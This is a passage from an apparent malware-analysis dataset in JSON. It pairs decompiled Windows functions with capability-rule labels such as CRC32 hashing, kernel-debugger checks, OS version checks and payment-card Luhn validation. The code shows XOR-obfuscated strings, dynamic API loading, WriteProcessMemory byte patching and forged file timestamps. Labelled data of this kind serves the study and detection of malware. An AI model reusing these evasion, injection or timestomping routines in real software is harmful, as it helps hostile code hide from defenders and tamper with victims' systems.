puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x0040f5dc:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x0040f5fd;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040f5c7;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x0040f5dc;\ncode_r0x0040f5c7:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x0040f5fd;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040f5fd:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 834
    },
    "00408fe7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00408fe7(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040d659": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d659(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "0040e3f5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e3f5(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040e7e4();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00402d23(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.00402dc8(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41cadc & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040e4f4();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040e4f4();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 547
    },
    "00402caf": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402caf(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    arg_8h = arg_8h - in_EDX;\n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(in_ECX, in_EDX, arg_8h + in_EDX, 1, 0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        in_EDX = in_EDX + 1;\n    } while (iVar2 < 5);\n    return 1;\n}\n",
        "token_count": 174
    },
    "004096b2": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004096b2(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint lpBuffer;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar5 = 0;\n    var_8h = param_1;\n    do {\n        *0x41cd3c = 0;\n        var_ch = (*_sym.imp.KERNEL32.dll_CreateFileW)(var_8h, 0x80000000, 3, 0, 3, 0, 0);\n        if (var_ch != 0) {\n            while ((iVar3 = var_ch, \n                   iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(var_ch, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0), \n                   iVar2 != 0 && (lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41cd3c = *0x41cd3c >> 8 ^ *((uVar1 ^ *0x41cd3c & 0xff) * 4 + 0x410390) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            iVar3 = fcn.0040590a(0x41cd30);\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        iVar5 = iVar5 + 1;\n        if (4 < iVar5) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 448
    },
    "0040bba8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bba8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.0040d1de(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.0040b27a();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 401
    },
    "0040d6b2": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040d6b2(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    char cVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    uchar *puVar9;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_17h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar9 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        var_4h = param_1;\n        cVar3 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar3 == '\\x05') {\n            var_28h = 0x303e4427;\n            var_24h = 0x44003729;\n            var_20h = 0x372e3026;\n            var_ch = 6;\n            var_1ch._0_1_ = 6;\n            stack0xffffffe1 = 0x4f303444;\n            var_17h = 0x37;\n            var_14h = 0x30514474;\n            var_10h._0_2_ = 0x374f;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                puVar1 = iVar6 + piVar5;\n                iVar7 = iVar6 % var_ch;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_28h - piVar5];\n            } while (iVar6 < 0x12);\n            piVar8 = piVar5;\n            do {\n                iVar2 = *piVar8;\n                *((var_4h - piVar5) + piVar8) = iVar2;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n        }\n        else {\n            var_50h = 0x68266b0b;\n            var_4ch = 0x6b2c662f;\n            var_48h = 0x6628683e;\n            var_44h = 0x682c6b2a;\n            var_40h = 0x6b196615;\n            var_3ch = 0x66396839;\n            var_38h = 0x68286b1c;\n            var_34h = 0x6b39663d;\n            var_30h = 0x66266805;\n            var_2ch = 0x68496b2f;\n            var_14h = 0x68496b58;\n            var_10h._0_2_ = 0x6649;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_ch = &var_50h - piVar5;\n            do {\n                puVar1 = iVar6 + piVar5;\n                iVar7 = iVar6 % 6;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_50h - piVar5];\n            } while (iVar6 < 0x28);\n            piVar8 = piVar5;\n            do {\n                iVar2 = *piVar8;\n                *((var_4h - piVar5) + piVar8) = iVar2;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    return;\n}\n",
        "token_count": 1088
    },
    "00402e2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00402e2f(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpLibFileName;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x14112930;\n    var_1ch = 0x557e3827;\n    var_18h._0_1_ = 0x75;\n    var_10h = 0x75674d51;\n    var_ch._0_1_ = 0x57;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    lpLibFileName = iVar3;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar3;\n        iVar4 = iVar6 % 5;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_10h + iVar4) ^ puVar1[&var_20h - iVar3];\n    } while (iVar6 < 9);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cad0 == NULL) {\n        var_34h = 0x30124f6a;\n        var_30h = 0x14705426;\n        var_2ch = 0x5f4d202a;\n        var_28h = 0xa732a0e;\n        var_24h._0_2_ = 0x6100;\n        var_1ch = 0x44613639;\n        var_18h._0_1_ = 0x43;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar3 = lpLibFileName;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + iVar6;\n            iVar5 = iVar4 % var_4h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_34h - iVar6];\n        } while (iVar4 < 0x12);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41cad0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    (**0x41cad0)(&var_8h, 4);\n    if (var_8h < 0) {\n        var_8h = -var_8h;\n    }\n    iVar6 = var_8h;\n    uVar2 = (*pcVar7)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 844
    },
    "00403aaf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403aaf(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41cadc = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "0040403a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040403a(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00403b18();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 287
    },
    "00404de7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404de7(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41cb18 = 1;\n    fcn.0040bc2b(param_1);\n    fcn.0040ad9e();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41cad8);\n    if (iVar1 != -1) {\n        fcn.004058c9();\n    }\n    fcn.004043c8();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.004042e6();\n    return;\n}\n",
        "token_count": 140
    },
    "00405811": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405811(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = fcn.00405c06();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.004059ee(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar2);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 407
    },
    "0040590a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040590a(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.00405c06();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x004059ac;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x004059ac;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x004059ac:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 604
    },
    "004059ee": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004059ee(uint lpLastWriteTime)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar4 = *0x41cd40;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar2 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar8 = iVar4 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar8 % 0xb + 1;\n    uVar8 = uVar8 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar8 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar8 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar8 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x470d454e;\n    var_58h = 0x7a2b6b22;\n    var_54h = 0x45024b23;\n    var_50h = 0x6b6e4708;\n    var_4ch = 0x4b347a19;\n    var_48h = 0x47094512;\n    var_44h = 0x7a206b3f;\n    var_40h = 0x45584b2a;\n    var_3ch = 0x6b174748;\n    var_38h = 0x4b2a7a26;\n    var_34h = 0x4754450f;\n    var_30h = 0x7a3d6b2e;\n    var_2ch = 0x456b4b22;\n    var_18h = 0x477a456b;\n    var_14h._0_1_ = 0x4b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    do {\n        var_10h = 5;\n        puVar1 = iVar9 + iVar4;\n        iVar7 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_18h + iVar7) ^ puVar1[&var_5ch - iVar4];\n    } while (iVar9 < 0x34);\n    iVar9 = fcn.00405c06();\n    if (iVar9 != 0) {\n        iVar7 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar9, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar7 != 0) && (iVar7 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar9, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return 0;\n}\n",
        "token_count": 1321
    },
    "00403be0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00403be0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41caf4 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "0040d1de": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040d1de(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.0040ca64(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040b27a();\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "0040eb1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
